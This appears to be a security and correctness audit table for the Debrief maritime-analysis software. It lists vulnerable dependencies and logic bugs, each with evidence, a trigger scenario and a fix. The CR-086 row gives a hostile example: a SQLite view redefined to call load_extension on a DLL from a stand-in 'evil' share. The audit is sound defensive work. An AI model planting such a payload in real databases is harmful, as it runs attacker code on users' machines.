CR-082,A4,org.mwc.cmap.legacy,-,poi-ooxml-4.1.2.jar,org.mwc.cmap.legacy/libs/poi-ooxml-4.1.2.jar,supply-chain,vulnerable-dependency,Medium,Medium,candidate,Apache POI 4.1.2 (2020) with CVE-2025-31672 reachable via .doc/.docx import,"poi-4.1.2, poi-ooxml-4.1.2, poi-ooxml-schemas-4.1.2, poi-scratchpad-4.1.2 and xmlbeans-3.1.0 are on the cmap.legacy Bundle-ClassPath L19-23 and exported to debrief.legacy. OSV lists CVE-2025-31672 (poi-ooxml: inconsistent handling of duplicate [Content_Types].xml entries lets a crafted OOXML file be parsed differently than intended) and CVE-2022-26336 (poi-scratchpad HMEF OOM; HMEF is not used by Debrief). XWPFDocument/HWPFDocument are constructed directly from analyst-selected .docx/.doc via MsDocXLoader/MsDocLoader and ImportASWDataDocument, so the ooxml path is reachable. POI 4.1.2 is also EOL and blocks Java 25 (#5237).","org.mwc.cmap.legacy/META-INF/MANIFEST.MF L19-L23; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java L343, L354, L408; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportASWDataDocument.java L616; org.mwc.debrief.core/plugin.xml L224-L228",A .docx with two conflicting [Content_Types].xml entries opened via File > Open.,"Upgrade to POI 5.4.x (poi, poi-ooxml, poi-ooxml-lite, poi-scratchpad, xmlbeans 5.x, commons-compress 1.27, log4j-api) and remove the duplicate POI 3.14 jars from org.mwc.debrief.legacy.",M,Needed to distinguish the HMEF-only CVE from the reachable OOXML one and to confirm the 3.14 copies are not the ones on the classpath.,CVE-2025-31672; CVE-2022-26336; #5237,
CR-083,A4,org.mwc.debrief.legacy,-,jsoup-1.11.3.jar,org.mwc.debrief.legacy/libs/jsoup-1.11.3.jar,supply-chain,vulnerable-dependency,Medium,High,candidate,jsoup 1.11.3 DoS (CVE-2021-37714) parsing XML from user-chosen PPTX template,"jsoup before 1.14.2 can be driven into an infinite loop / excessive CPU by crafted markup (CVE-2021-37714); 1.11.3 also carries CVE-2022-36033 (XSS via cleaner, not used). ParsePresentation L31 and FindMap L51 call Jsoup.parse(..., Parser.xmlParser()) on slide XML extracted from the analyst-selected PowerPoint template, so a hostile template hangs the export.",org.mwc.debrief.legacy/META-INF/MANIFEST.MF L15; Debrief/ReaderWriter/powerPoint/ParsePresentation.java L31; Debrief/ReaderWriter/powerPoint/FindMap.java L51,A .pptx template whose ppt/slides/slide1.xml contains the CVE-2021-37714 trigger (deeply nested unclosed tags) selected in Preferences and used by Export to PowerPoint.,Upgrade to org.jsoup:jsoup 1.18.x (API compatible for parse/select).,S,grep-able,CVE-2021-37714; CVE-2022-36033,
CR-084,A4,org.mwc.debrief.pepys,-,c3p0-0.9.5.5.jar,org.mwc.debrief.pepys/libs/c3p0-0.9.5.5.jar,supply-chain,vulnerable-dependency,Medium,Low,candidate,c3p0 0.9.5.5 / mchange-commons-java 0.2.20 flagged by four 2026 advisories,"OSV reports CVE-2026-27830 (HIGH) and CVE-2026-55223 for com.mchange:c3p0 0.9.5.5 and CVE-2026-27727 / CVE-2026-55153 (HIGH) for com.mchange:mchange-commons-java 0.2.20; c3p0 has had no release since 2019. ComboPooledDataSource is instantiated directly (PostgresDatabaseConnection L147, SqliteDatabaseConnection L144) for every Pepys connection. Exploitability in Debrief could not be assessed here because the advisory texts were not fetched; marked Low confidence on impact.",org.mwc.debrief.pepys/META-INF/MANIFEST.MF L8-L15; org.mwc.debrief.pepys/src/main/java/org/mwc/debrief/pepys/model/db/PostgresDatabaseConnection.java L147-L153; org.mwc.debrief.pepys/src/main/java/org/mwc/debrief/pepys/model/db/SqliteDatabaseConnection.java L144,Depends on advisory details; Pepys connects with attacker-influenced configuration.,"Read the four advisories; replace c3p0 with HikariCP (actively maintained, ~150 KB) or drop pooling since Pepys opens a single connection.",S,grep-able,CVE-2026-27830; CVE-2026-55223; CVE-2026-27727; CVE-2026-55153,
CR-085,A4,org.mwc.debrief.pepys,-,postgresql-42.2.11.jar,org.mwc.debrief.pepys/libs/postgresql-42.2.11.jar,supply-chain,vulnerable-dependency,Medium,Medium,candidate,pgjdbc 42.2.11 (8 CVEs) used for Pepys database import,"postgresql-42.2.11 (Mar 2020) is affected by CVE-2020-13692 (XXE in PgSQLXML when reading XML columns from a hostile server), CVE-2022-21724 (arbitrary class instantiation from connection properties), CVE-2022-31197 (SQL injection in ResultSet.refreshRow), CVE-2022-41946 (world-readable temp files for large prepared-statement parameters), CVE-2024-1597 (SQL injection when preferQueryMode=simple) and CVE-2026-42198. PostgresDatabaseConnection.initialize L140-153 builds the JDBC URL and user/password from the Pepys configuration file the analyst loads, so a malicious config or server controls the driver; simple query mode is not enabled, so CVE-2024-1597 does not apply.",org.mwc.debrief.pepys/META-INF/MANIFEST.MF L8-L15; org.mwc.debrief.pepys/src/main/java/org/mwc/debrief/pepys/model/db/PostgresDatabaseConnection.java L140-L153,A shared Pepys .ini pointing at an attacker-run PostgreSQL that returns crafted XML/refreshRow responses; or CVE-2022-41946 temp-file exposure on multi-user hosts.,"Upgrade to org.postgresql:postgresql 42.7.x (drop-in) and set ssl=true by default instead of the hard-coded ""ssl"",""false"" at L145.",S,grep-able for version; reachability needed reading the config-driven connection code.,CVE-2020-13692; CVE-2022-21724; CVE-2022-31197; CVE-2022-41946; CVE-2024-1597; CVE-2026-42198,
CR-086,A4,org.mwc.debrief.pepys,-,sqlite-jdbc-3.30.1.jar,org.mwc.debrief.pepys/libs/sqlite-jdbc-3.30.1.jar,supply-chain,vulnerable-dependency,Medium,Medium,candidate,sqlite-jdbc 3.30.1 (CVE-2023-32697) + load_extension on user-supplied DBs,"sqlite-jdbc before 3.41.2.2 allows code execution through a crafted JDBC URL (CVE-2023-32697, native library written to a predictable temp path) and the bundled SQLite 3.30.1 (2019) lacks four years of upstream fixes. SqliteDatabaseConnection.initialize L141-142 additionally calls SQLiteConfig.enableLoadExtension(true) before opening whichever .sqlite file the Pepys configuration names (L149-158), so any SQL executed against a hostile database that defines views/triggers invoking load_extension() loads native code.",org.mwc.debrief.pepys/META-INF/MANIFEST.MF L8-L15; org.mwc.debrief.pepys/src/main/java/org/mwc/debrief/pepys/model/db/SqliteDatabaseConnection.java L141-L160,A shared Pepys SQLite export whose 'States' view is redefined as SELECT load_extension('\\evil\share\x.dll').,"Upgrade to org.xerial:sqlite-jdbc 3.46+, load SpatiaLite explicitly via a fixed path and turn enableLoadExtension back off after loading it.",S,Needed to connect the driver CVE with the enableLoadExtension setting and the config-supplied file path.,CVE-2023-32697,
CR-087,A4,org.mwc.debrief.targetplatforms,-,eclipse-latest.target,org.mwc.debrief.targetplatforms/eclipse-latest.target,supply-chain,outdated-dependency,Medium,High,candidate,"Target platform pinned to Eclipse 2021-12 / GEF 3.11 (2016), http repos","The target pins Eclipse platform 4.22 (releases/2021-12, L45-67), GEF 3.11.0.201606061308 (2016, L62), Orbit R20210223232630 (guava 30.1, gson 2.8.6, protobuf 2.4.0 from 2011, asm 5.0.1, L86-92), Nebula 2.5.0 (L95), EASE 0.8.0 (L70), WTP 3.23 / webtools 2021-03 (L37, L100) and a duplicate 2021-03 release repo (L42). Eclipse 4.22 predates the platform XXE fix CVE-2023-4218 (Eclipse < 4.29 parses project XML without entity restrictions) and four years of SWT/JFace/p2 fixes; three repositories are fetched over http:// (L42, L45, L95). The Java 25 upgrade (#5237) requires Eclipse 2025-09+ anyway.","org.mwc.debrief.targetplatforms/eclipse-latest.target L37, L42, L45, L62, L70, L92, L95, L100, L151",Open a hostile .project/.settings XML in the workspace (CVE-2023-4218); MITM of http:// p2 metadata during a build.,"Regenerate eclipse-latest.tpd against Eclipse 2025-09 (or the release chosen for #5237), latest Orbit/Nebula/EASE, GEF Classic 3.20, and use https:// for every repository.",L,grep-able,CVE-2023-4218; #5237,
CR-088,A5,org.mwc.cmap.legacy,MWC.Algorithms.EarthModels,FlatEarth,org.mwc.cmap.legacy/src/MWC/Algorithms/EarthModels/FlatEarth.java,bug,thread-safety,Medium,Medium,candidate,Global earth model returns one shared mutable WorldLocation from add(),"add() writes its result into the instance field _workingLocation and returns it. Because a single FlatEarth instance is the process-wide model held in WorldLocation._model, two threads calling WorldLocation.add/addToMe concurrently (e.g. SATC/TMA solver threads, background import while the plot paints) can interleave setLat/setLong/setDepth and the copy made in WorldLocation.add, yielding a location with mixed lat/long from two different calls.",L96; L108-L146,Import a large .dpf on a background job while a plot with relative-projection animation repaints; occasional fixes land at a corrupted position.,"Allocate the result (or accept a caller-supplied result object as subtract(...,res) already does) rather than sharing a field on a globally shared instance.",S,Requires knowing the instance is installed as a static singleton by WorldLocation and CorePlugin; local inspection of the method looks like a harmless optimisation.,-,
CR-089,A5,org.mwc.cmap.legacy,MWC.Algorithms,FrequencyCalcs,org.mwc.cmap.legacy/src/MWC/Algorithms/FrequencyCalcs.java,algorithm-correctness,logic-error,Medium,Medium,candidate,"calcDopplerComponent hard-codes 2951 kts speed of sound, ignores preference","calcDopplerComponent uses a local constant speedOfSoundKts = 2951 rather than the value the application configures via SPEED_OF_SOUND_KTS_PROPERTY/SpeedOfSoundKts, whereas the related getPredictedFreq/calcPredictedFreqSI take the speed of sound as a parameter. Debrief.Wrappers.Track.Doublet calls calcDopplerComponent when computing ownship Doppler corrections for frequency residual analysis, so a user-set speed of sound (e.g. 2900 kts for warm water) is silently not applied to that component. Also uses (bearing - course) without wrap, which is harmless under cos but inconsistent with travellingTowards, a private helper referenced only by the inline test.",L558-L560; L571-L582; L642-L651,Set SpeedOfSound preference to 2900 kts and view frequency residuals: the ownship Doppler correction still uses 2951 kts (about 1.8% error in the correction term).,Add a speedOfSoundKts parameter (or read the shared property) to calcDopplerComponent and pass it from Doublet.,S,Requires noticing the constant duplicates a configurable property and following the Doublet call path.,Debrief.Wrappers.Track.Doublet L42 L295,
CR-090,A5,org.mwc.cmap.legacy,MWC.Algorithms.Projections,FlatProjection,org.mwc.cmap.legacy/src/MWC/Algorithms/Projections/FlatProjection.java,algorithm-correctness,projection-error,Medium,High,candidate,"zoom(value, area) shifts the data area with dimensionally wrong deltas","After scaling, the method computes deltaX = actualCenter.lat - desiredCenter.lat and deltaY = long difference (names swapped) and then adds deltaX * _scaleVal to latitudes and deltaY * _scaleVal to longitudes, multiplying a degree offset by a degrees-per-pixel scale. The intended recentring on 'area' therefore moves the view by an arbitrary amount (tiny at normal scales), and the comment at L447 admits the inline test does not pass. This is the production path for the plot Zoom tool when dragging bottom-right to top-left (plotViewer ZoomIn -> ZoomOutAreaAction -> projection.zoom(scale, area)).",L447; L477-L491; L47-L106,In the plot editor select the zoom tool and drag a rectangle from bottom-right to top-left: the view zooms out but is not centred on the selected area.,"Compute the new area directly: centre on area.getCentre() with width/height equal to the old area's times value (or reuse setCentre on the recomputed area), and enable the inline test.",S,Needs unit reasoning (degrees times degrees/pixel) and tracing the RCP caller to see that the TODO-marked code is live.,org.mwc.cmap.plotViewer ZoomIn L180; MWC/GUI/Tools/Chart/ZoomOut.java L200,
CR-091,A5,org.mwc.cmap.legacy,MWC.GenericData,Duration,org.mwc.cmap.legacy/src/MWC/GenericData/Duration.java,bug,string-parsing,Medium,High,verified,fromString maps unknown units to MICROSECONDS; NoSuchElementException,"fromString tokenises value and units and calls getUnitIndexFor, which returns 0 (MICROSECONDS) for any unrecognised label; verified Duration.fromString(""12 mins"") yields 0 ms. A string with no units token throws NoSuchElementException rather than the declared ParseException. Used by StepperHandler (trail length, step sizes) and MWCXMLReader.readThisDuration when loading .dpf files.",L133-L152; L168-L178,".dpf Stepper attribute TrailLength=""5 mins"" (or ""5 min""): loaded as 5 microseconds, effectively zero trail; ""5"" alone crashes the loader with NoSuchElementException.",Validate the token count and reject unknown unit labels with ParseException; accept common aliases.,S,The dangerous default (index 0 = smallest unit) is only apparent by reading the labels array ordering together with the loader callers.,org.mwc.debrief.core StepperHandler L194 L409-L431,
CR-092,A5,org.mwc.cmap.legacy,MWC.GenericData,HiResDate,org.mwc.cmap.legacy/src/MWC/GenericData/HiResDate.java,bug,time-handling,Medium,High,verified,"copyOnlyTime/copyOnlyDate use the default local time zone, shifting across DST","Both helpers build Calendar.getInstance() (JVM default zone) and copy HOUR_OF_DAY etc., while every other Debrief formatter is fixed to GMT (GMTDateFormat). When source and target fall on different DST offsets the copied time shifts by the DST delta. Verified by compiling with -Duser.timezone=Europe/London: copyOnlyTime(2020-07-01T12:00Z, 2020-01-15T00:00Z) returns 200115 130000 instead of 120000. Callers are the Pepys import time-filter controls.",L248-L261; L269-L281,Pepys import dialog: user keeps the time-of-day from a summer date and changes the date to winter (or vice versa) on a machine in a DST zone; the filter boundary moves by one hour.,"Use Calendar.getInstance(TimeZone.getTimeZone(""GMT"")) (or java.time with ZoneOffset.UTC) in both helpers.",S,grep-able,org.mwc.debrief.pepys PepysImportController L166 L190 L215 L239,
CR-093,A5,org.mwc.cmap.legacy,MWC.GenericData,TimePeriod,org.mwc.cmap.legacy/src/MWC/GenericData/TimePeriod.java,bug,null-deref,Medium,High,verified,BaseTimePeriod NPE on INVALID_DATE (null) in overlaps/hashCode/contains,"INVALID_DATE is null, yet overlaps() calls _startDTG.equals(INVALID_DATE) and _endDTG.equals(INVALID_DATE) before checking for null, so the documented 'we don't have a start time -> return TRUE' branch is unreachable; verified new BaseTimePeriod(null,null).overlaps(a,b) throws NullPointerException. hashCode() calls getStartDTG().getDate() and also NPEs on the INVALID period (verified), so such periods cannot go in hash collections even though equals() handles nulls. contains(null) likewise NPEs.",L113-L124; L181-L187; L220-L245,"Layer or narrative entry with unset start/end (period created via new BaseTimePeriod(null,null) then overlaps(...) during time-filtering).",Test _startDTG == null / _endDTG == null (or use isInvalid()) before dereferencing; make hashCode null-safe with Objects.hash.,S,grep-able,-,
CR-094,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldArea,org.mwc.cmap.legacy/src/MWC/GenericData/WorldArea.java,algorithm-correctness,unit-mismatch,Medium,High,candidate,rangeFromEdge mixes Euclidean lat/lon degrees with earth-model ranges,"distancePointLine computes the projection parameter r and the perpendicular |s|*L in raw (long,lat) degree space with no cos(lat) weighting, but falls back to p.rangeFrom(A)/rangeFrom(B) (earth-model great-circle degrees) when r<=0 or r>=1. The two metrics differ by up to 1/cos(lat) in longitude, so rangeFromEdge is discontinuous at the corner boundaries and over-reports distance to E/W edges at high latitude.",L354-L390; L879-L897,"WorldArea at 60N, point due east of the right edge by 1 deg lon: rangeFromEdge returns ~1.0 deg (60 nm) while the corner fallback would return ~0.5 deg (30 nm).",Perform the segment maths in a locally scaled frame (x scaled by cos(midLat)) or express edges via WorldLocation.rangeFrom to a projected foot point.,S,Needs tracing two different distance metrics through the same branch structure; a type checker sees only doubles.,-,
CR-095,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldArea,org.mwc.cmap.legacy/src/MWC/GenericData/WorldArea.java,algorithm-correctness,degenerate-input,Medium,High,verified,Areas spanning the antimeridian normalise to the complementary near-global box,"normalise() (and extend/contains) simply take min/max of raw longitudes, so an area whose corners are at 179E and 179W becomes 358 deg wide with TL longitude -179 and BR +179 (verified by compiling). getWidth/getCentre then describe the wrong region, contains() answers for the complement, and fit-to-window in FlatProjection.zoom gives up (width>=360 check) or shows the whole world.",L457-L465; L472-L487; L520-L548; L566-L581; L737-L755; L772-L825,Load a .rep track crossing 180 deg longitude; Fit-to-window shows the whole globe and bounding-area filters exclude the track's fixes.,"Represent longitude extent explicitly (west edge + positive width, or normalise relative to a reference meridian) and update contains/extend/getCentre accordingly.",M,Dateline handling is a domain invariant; the code's min/max logic is locally correct arithmetic.,FlatEarth dateline row,
CR-096,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldDistance,org.mwc.cmap.legacy/src/MWC/GenericData/WorldDistance.java,bug,string-parsing,Medium,Medium,candidate,getUnitIndexFor silently maps unknown unit labels to METRES,"getUnitIndexFor returns 0 (METRES) when the label does not exactly match one of {m,yds,km,nm,minutes,degs,kyds,ft} (case sensitive). It is called from the XML handlers WorldDistanceHandler (L55, L92), GridHandler and ASSET XMLVariance, so a hand-edited or foreign .dpf/.xml with Units=""NM"" or ""nmi"" is loaded as metres with no error. WorldSpeed.getUnitIndexFor (L144-L154) and WorldAcceleration.getUnitIndexFor have the identical default.",L163-L173,".dpf containing <WorldDistance Units=""NM"" Value=""10""/> for a range ring: loaded as 10 m.",Return -1 or throw IllegalArgumentException for unknown labels and have handlers report the error; compare case-insensitively with documented aliases.,S,"The default value is only wrong in the context of the XML callers, which a grep for the method does not reveal.",WorldSpeed L144-L154; WorldAcceleration L122-L132; MWC/Utilities/ReaderWriter/XML/Util/WorldDistanceHandler.java L55 L92,
CR-097,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldLocation,org.mwc.cmap.legacy/src/MWC/GenericData/WorldLocation.java,bug,thread-safety,Medium,Medium,candidate,Static shared _myWorldVector and mutable static earth model,"bearingFrom() and rangeFrom(other) pass the static field _myWorldVector as the result buffer to _model.subtract and then read range/bearing from it; concurrent callers on different threads overwrite each other's result, so a range or bearing can be read from another thread's computation. The earth model itself is a mutable static (_model, setModel) that is replaced at runtime by CorePlugin extension loading and by tests, making all distance results depend on global process state.",L260-L266; L521-L525; L659-L663; L326-L328; L471-L475,Two analysis jobs (e.g. SATC solver and a tote update) compute rangeFrom simultaneously; one receives the other's range value.,Use a fresh WorldVector (or ThreadLocal) in bearingFrom/rangeFrom; consider making the model final after startup or documenting single-threaded use.,S,Data race on a static buffer is only visible when correlating the private static with callers across threads; grep finds statics but not the race.,-,
CR-098,A6,org.mwc.debrief.legacy,Debrief.Wrappers,FixWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/FixWrapper.java,algorithm-correctness,angle-wrap,Medium,High,verified,interpolateFix interpolates longitude linearly across the antimeridian,"interpolateFix computes dLong = next.lon - prev.lon and adds the proportion, so a leg from 179.5E to 179.5W yields an interpolated longitude near 0 (verified midpoint = 0.0) i.e. a point on the other side of the globe. Used by getNearestTo when interpolation is on, by resampling (decimatePointsTrack), infills and worm-in-hole offsets, so resampled tracks crossing the dateline acquire garbage fixes.",L854; L891,"Track crossing 180 degrees longitude with 'Interpolate points' on, or 'Resample data at' applied","Normalise dLong into (-180,180] before scaling and wrap the resulting longitude, mirroring the existing course handling.",S,The course wrap handling right beside it makes the omission for longitude easy to miss; requires domain reasoning.,-,
CR-099,A6,org.mwc.debrief.legacy,Debrief.Wrappers,FixWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/FixWrapper.java,algorithm-correctness,division-by-zero,Medium,High,candidate,interpolateFix divides by zero time delta when previous and next share a DTG,"proportion = thisDelta/timeDiffMicros with no guard; when previous and next have the same time (e.g. TrackSegment.decimateRelativeTMA passes first()==last() for a one-fix leg, WormInHoleOffset passes consecutive fixes that collided) the result is NaN/Infinity and a Fix with NaN lat/lon/course is created and inserted, which then poisons offsets (RelativeTMASegment.setOffset) and bounds.",L842-L848; TrackSegment L753-L757; WormInHoleOffset L310,"Relative TMA leg containing a single fix, then resample the parent track",Return a copy of previous when timeDiffMicros==0 (or when dtg equals either end) instead of dividing.,S,Needs call-site analysis to find inputs where the two fixes coincide.,-,
CR-100,A6,org.mwc.debrief.legacy,Debrief.Wrappers,SensorContactWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/SensorContactWrapper.java,bug,null-deref,Medium,Medium,candidate,isBearingToPort unboxes null Boolean when host has no fix at cut time,"isBearingToPort() only assigns _cachedPortBearing when getNearestTo returns a fix; otherwise it returns the null Boolean, which auto-unboxes to NullPointerException. It also dereferences _mySensor._myHost without a null check. Callers: paint() for ambiguous cuts and the 'Keep port/starboard bearing' actions (ditchBearing).",L1151-L1174,Sensor with ambiguous bearings whose cuts extend before the host track's first fix; right-click such a cut and choose 'Keep port bearing',Return a primitive with a defined default (or Boolean.FALSE) when no host fix is found and guard the host reference.,S,"Auto-unboxing of a cached Boolean is a subtle control-flow issue, not grep-able.",-,
CR-101,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,AbsoluteTMASegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/AbsoluteTMASegment.java,bug,null-deref,Medium,Medium,candidate,Split absolute TMA legs have null start/end; DTG edits throw NPE,"TrackWrapper.splitTrack constructs the two halves with new AbsoluteTMASegment(theTMA, p1, loc, null, null), leaving _startTime/_endTime null. setDTG_End/setDTG_Start then call createDataFrom(_startTime,_endTime) which dereferences startTime.getDate(), and getDTG_Start()/getDTG_End() show null in Properties. shear() also leaves System.out debug prints.",L98-L103; L172; L193; L298; L309; L331-L340; TrackWrapper L3660-L3662,"Split an absolute TMA leg at a fix, select the new leg and edit 'End time' in Properties",Derive _startTime/_endTime from the supplied fixes in the copy constructor when null; remove the printlns.,S,Requires following the split path in TrackWrapper into the constructor contract.,-,
CR-102,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,DynamicInfillSegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/DynamicInfillSegment.java,bug,degenerate-input,Medium,High,candidate,reconstruct feeds SplineInterpolator <3 or non-increasing samples,"oneUse=min(2,before.size()) and twoUse=min(3,after.size()) can total 2 points (two one-fix legs), and overlapping legs (before.endDTG >= after.startDTG, allowed by RelativeTMASegment.setDTG_End) give non-monotonic times; SplineInterpolator.interpolate then throws NumberIsTooSmallException/NonMonotonicSequenceException from inside a PropertyChangeListener or paint cycle. The two-arg constructor also calls before.last().getColor() on a possibly empty segment.",L305; L540-L541; L576-L578,"Generate an infill between two legs, then extend the earlier leg's DTG End past the later leg's start",Validate n>=3 and strictly increasing times before interpolating; fall back to linear interpolation or clear the infill with a logged error.,S,Needs the commons-math precondition knowledge plus the leg-editing paths that can violate it.,-,
CR-103,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,LightweightTrackWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/LightweightTrackWrapper.java,bug,null-deref,Medium,Medium,candidate,getNearestTo returns {null} array; callers dereference [0],"When the DTG is outside the track period, getNearestTo returns new Watchable[]{null} instead of EMPTY_WATCHABLE_LIST, so callers that test length>0 (ArrayOffsetHelper.getArrayCentre L174, TrackWrapper-style consumers) dereference null. DynamicTrackShapeSetWrapper.paintOverride already defends against list[0]==null, evidence the bug is being hit. getUnfilteredItems also dereferences getStartDTG() on an empty track.",L563-L592; L693; ArrayOffsetHelper L174,Lightweight track (e.g. imported from a large REP/NMEA set) with a sensor whose cut time is outside the track period; open the plot,Return EMPTY_WATCHABLE_LIST when nearest==null.,S,Requires reading the contract of the sibling TrackWrapper implementation and its callers.,-,
CR-104,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,RelativeTMASegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/RelativeTMASegment.java,algorithm-correctness,angle-wrap,Medium,High,verified,fanStretch mis-normalises drag angle; drags near north reverse range sign,"theBrg = 2pi+vector.getBearing() lies in [pi,3pi] and midBrg in [0,2pi); theDelta is only reduced while > 2pi, leaving values in (-pi,2pi]. A delta of e.g. 6.08 rad (true separation 0.2 rad) fails abs(theDelta)>pi/2 in the wrong direction and the range is negated (verified), so dragging the fan outward near the sensor bearing's north crossing moves the solution inward.",L431-L446,"Fan-stretch drag of a relative TMA leg whose mid bearing is within a few degrees of north, dragging on the other side of north","Normalise theDelta into (-pi,pi] (while > pi subtract 2pi, while < -pi add 2pi) before the abs test.",S,Requires range analysis of composed bearing offsets; the loop looks like a normalisation.,-,
CR-105,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,RelativeTMASegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/RelativeTMASegment.java,bug,null-deref,Medium,Medium,candidate,"Unchecked sensor/layers/host lookups in DTG editing, rotate and remove","setDTG_Start dereferences getReferenceTrack() (may be null before identify), _referenceSensor.getSensorOffset() (null when the segment references a track without a matching sensor, which setTrack merely logs) and hostFix.getLocation() (getBacktraceTo returns null when no visible fix). rotate() calls hostReference.add() where getHostLocation() can return null; identifyReferenceTrack dereferences _theLayers which is null for segments built via the test/legacy constructor; removeElement calls elements().nextElement() on an already-empty segment.",L713; L774; L832; L1001; L1030-L1033,"Relative TMA leg whose named sensor was renamed/deleted, then edit 'DTG Start' in Properties","Null-check the sensor/track/backtrace results and log+return, matching the pattern already used in getHostLocation().",S,Needs knowledge of which lookups are allowed to fail (setTrack logs and continues).,-,
CR-106,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,RelativeTMASegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/RelativeTMASegment.java,algorithm-correctness,float-equality,Medium,Medium,candidate,stretch() uses exact WorldLocation.equals to pick dragged end,"rotate() and shear() (L820-L826, L1210-L1216) explicitly avoid WorldLocation.equals because DR rendering shifts the first fix by tiny amounts, yet stretch() still uses first.getLocation().equals(origin). When equality fails while the user drags the far end, the else branch relocates the start along an essentially zero-length thisLeg with an arbitrary bearing, throwing the leg origin to a random position. AbsoluteTMASegment.rotate/shear/stretch (L258, L333, L418) have the same exact test.",L1293-L1305,Stretch-drag the end of a relative TMA leg after it has been shifted/dragged once,Reuse the distFromOrigin<distFromEnd test used by rotate/shear in stretch() and in AbsoluteTMASegment.,S,The inconsistency is only evident by comparing sibling methods and reading the comment that explains why equals is unsafe.,AbsoluteTMASegment L258; L333; L418,
CR-107,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,TrackSegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/TrackSegment.java,bug,division-by-zero,Medium,High,candidate,Integer time division in DR append; unguarded interval division in resample,"append() for DR segments computes timeSecs as a long division (millis/1000), so fixes under 1 s apart give spdYps=Infinity and coarser gaps are truncated, corrupting the joining fix's course/speed used by DR reconstruction (mergeAllSegments/combineSections). decimateRelative (L711) and setResampleDataAt (L1089) divide by the interval before the <=0 guard, so a 0 interval throws ArithmeticException.",L600-L604; L711; L1089,Merge two DR track segments whose boundary fixes are 0.5 s apart; or choose frequency 'None' on a segment,Use double seconds and guard zero deltas; hoist the <=0 interval check above the divisions.,S,Integer-vs-double division is invisible to a grep; needs unit reasoning.,-,
CR-108,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,TrackSegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/TrackSegment.java,bug,null-deref,Medium,High,candidate,rangeFrom/paint/getSegmentFor assume a non-empty segment,"rangeFrom() calls getTrackStart() (getData().iterator().next()) before the isEmpty() check, so an empty segment (an infill shown as '[Recalculating]') throws NoSuchElementException from TrackWrapper.findNearestSegmentHotspotFor during a drag/hit test. paint() ends with drawMyStalk(dest,lastPoint,lastButOne,true) where lastButOne is null for a one-fix segment (NPE) and drawMyStalk divides xDelta/yDelta (Infinity for a horizontal pair). SegmentList.getSegmentFor dereferences endDTG() which is null for an empty segment.",L818; L898; L964; L969-L975; TrackWrapper_Support L326,"Track containing an infill that could not be generated (empty), then drag-select near the track","Check isEmpty() first in rangeFrom, guard the stalk drawing for <2 points, and null-check endDTG in getSegmentFor.",S,"Ordering bug between a guard and the call it should protect; needs reading, not grepping.",-,
CR-109,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TrackWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TrackWrapper.java,bug,logic-error,Medium,High,candidate,Stale caches: getNearestTo _lastFix/_lastPosIterator and rangeFrom _myWorldArea,"flushPositionCache() is an empty method, so after addFix/removeElement/setDTG the cached _lastFix and _lastPosIterator remain: getNearestTo(T) returns a deleted fix if T was the last time requested, and the cached iterator's currentElement() may be a removed fix. The cache is also keyed on time alone, so a call with onlyVisible=false caches a hidden fix that a later onlyVisible=true call returns, and the cached-iterator path sets previous=thisPos without checking visibility, so interpolation can use a hidden fix. Similarly _myWorldArea (used by rangeFrom) is only built in addFix and never updated by add(TrackSegment), shift/drag or removeElement, so tracks assembled from segments (TMA tracks, split/merge/paste results) return INVALID_RANGE and moved tracks use stale bounds for hit-testing.",L885; L1139-L1142; L1706; L2140-L2142; L2158-L2185; L2245; L3052-L3060; L3302,"Step the time slider to fix F, delete F from the Outline view, tote/plot still reports F for that time",Clear _lastFix and _lastPosIterator in flushPositionCache() and call it from every mutation path; include onlyVisible in the cache key; derive rangeFrom from getBounds() or rebuild _myWorldArea lazily.,S,Requires noticing that a method named flush* is a no-op and tracing stale-state consequences across calls.,-,
CR-110,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TrackWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TrackWrapper.java,bug,null-deref,Medium,Medium,candidate,"Merge/contiguous/visibility helpers NPE on SegmentList, empty or hidden data","checkTheyAreNotOverlapping leaves _periods[i] null for a SegmentList subject (which mergeTracks explicitly supports at L676) or builds a period from null start/end for an empty track, then calls timePeriod.overlaps(...) -> NPE. WrappedIterators() leaves currentIter null, so contiguousElements().hasMoreElements() throws when sensors/solutions are hidden and the Positions layer is hidden (DblClickEdit uses it). visibleBetween dereferences getStartDTG() on an empty track; groupTracks calls ts.startDTG().getDate() on an empty segment.",L282-L284; L317; L353-L385; L480; L491; L3935,Select a track's 'Positions' folder plus another track and choose Merge Tracks,Handle SegmentList in checkTheyAreNotOverlapping and skip null periods; initialise currentIter to EmptyIterator; null-check start/end DTGs.,S,Requires correlating supported subject types in mergeTracks with the helper's instanceof chain.,-,
